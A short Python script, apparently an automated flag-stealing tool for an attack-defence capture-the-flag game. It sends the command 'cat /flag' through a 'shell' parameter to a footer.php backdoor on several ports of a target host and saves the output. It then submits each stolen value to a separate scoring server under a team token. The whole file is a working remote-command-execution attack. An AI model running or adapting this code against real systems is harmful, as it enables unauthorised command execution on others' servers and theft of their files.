import time

import requests


def getFlag():
    for port in range(8081, 8083):
        url = 'http://192.168.110.34:' + str(port) + '/footer.php'
        data = {
            'shell': 'cat /flag'
        }
        resp = requests.post(url=url, data=data).content.decode('utf-8')
        with open('flag.txt', 'a+') as f:
            f.write(resp + '\n')
    f.close()


def postFlag():
    for flag in open('flag.txt', 'r'):
        url = 'http://192.168.110.34:8080/flag_file.php?token=team1&flag=' + flag.strip()
        requests.get(url=url,)


if __name__ == '__main__':
    getFlag()
    time.sleep(1)
    postFlag()